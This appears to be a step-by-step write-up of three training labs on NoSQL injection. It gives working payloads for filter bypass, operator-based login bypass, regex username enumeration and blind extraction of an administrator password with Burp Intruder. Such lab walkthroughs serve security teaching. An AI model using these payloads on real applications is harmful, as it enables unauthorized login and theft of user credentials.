<img src="images/image1.png" alt="third" width="500">

**Step1:**

Click on any categories

<img src="images/image2.png" alt="third" width="500">

**Step2:**

Send the GET filter request to repeater

<img src="images/image3.png" alt="third" width="500">

**Step3:**

Check the injection point using '

<img src="images/image4.png" alt="third" width="500">

Now we use `\'`

<img src="images/image5.png" alt="third" width="500">

So it is clear that NoSQL vulnerability exist

**Step4:**

Now we inject this payload to view all product '||1||'

<img src="images/image6.png" alt="third" width="500">

And lab is solved

<img src="images/image7.png" alt="third" width="500">

**Step1:**

Login in to your account using wiener:peter

<img src="images/image8.png" alt="third" width="500">

Send the request to POST /login to repeater

**Step2:**

If we use  this payload it show id wiener in response. it is clear that password is not checking
```
{ "username": "wiener",

"password":{

"$ne":""

  }

}
```
<img src="images/image9.png" alt="third" width="500">

**Step3:**

If we replace the above word with admin or administrator it is not showing any redirection

<img src="images/image10.png" alt="third" width="500">

**Step4:**

To find username we using regex with the search that any username having adm in his name
```
{ "username": { "$regex": ".*adm.*" }, "password":{

"$ne":""

  }

}
```

<img src="images/image11.png" alt="third" width="500">

**Step5:**

Now replace name with the response name and modify rquery to

```
{ "username": "adminhcijsjg3", "password":{

"$ne":""

  }

}
```
<img src="images/image12.png" alt="third" width="500">

And open the request in browser it will solve.

Or paste session in inspect -> cookie value and refresh page and click on my-account button.

<img src="images/image13.png" alt="third" width="500">

**Step1:**

First login with given credential

<img src="images/image14.png" alt="third" width="500">

**Step2:**

Send the GET /user/lookup request to  repeater

**Step3:**

When I use ' ' it show error

<img src="images/image15.png" alt="third" width="500">

If we use url encoded `'%2b'`

<img src="images/image16.png" alt="third" width="500">

**Step4:**

Now we find password for administrator user

`administrator' && this.password.length < 30 || '1'=='2`

<img src="images/image17.png" alt="third" width="500">

The result show password is less then 30

After some try I found password is 7 character.

This can be found using number payload in intruder

**Step4:**

To extract password we use

`administrator' && this.password[§0§]=='§a§`

Send the above request to intruder

Attack type: cluster bomb

<img src="images/image18.png" alt="third" width="500">

Payload1 setting

<img src="images/image19.png" alt="third" width="500">

Payload2 setting

<img src="images/image20.png" alt="third" width="500">

**Step5**  
to find password first sord payload1 then sort length

<img src="images/image21.png" alt="third" width="500">

We have password

Knzddwlw
